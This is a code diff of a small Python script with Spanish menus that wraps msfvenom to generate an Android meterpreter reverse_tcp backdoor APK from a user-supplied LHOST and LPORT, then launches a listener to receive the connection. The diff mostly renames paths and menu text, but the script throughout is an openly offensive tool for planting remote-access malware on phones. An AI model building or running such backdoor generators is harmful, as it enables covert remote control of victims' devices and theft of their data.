@@ -4,35 +4,24 @@
 import os 
 import sys
 import socket
-sys.path.append('core/')
+sys.path.append('listener/')
 from listener import *
 
 print("""
-1) BackDoor 
-2) Listener
-
+		1.- Crear Backdoor 
+		2.- Configurar Listener
 """)
-
-choice = raw_input("Elige una opcion #~:  ")
-
-if(choice=="1"):
-	print("""
-
-1. Backdoor Android
-
-       """)
-	bd = raw_input("Para generar backdoor presione 1? #~: ")
-
-	if(bd=="1"):
+sel = raw_input("Selecciona una opcion:")
+if(sel=="1"):
+	s = raw_input("Para crear el Backdoor presione 1: ")
+	if(s=="1"):
 		os.system("clear")
-		os.system("ANDROID BACKDOOR")
 		lhost = raw_input("LHOST: ")
 		lport = raw_input("LPORT: ")
-		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /home/froilan/Desktop/test.apk")
-		print("(*) Backdoor generado")
-
-
-if(choice=="2"):
+		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /home/kali/Desktop/test_backdoor.apk")
+		print("Se genero el Backdoor.... ")
+		listener()
+if(sel=="2"):
 	listener()
 
 
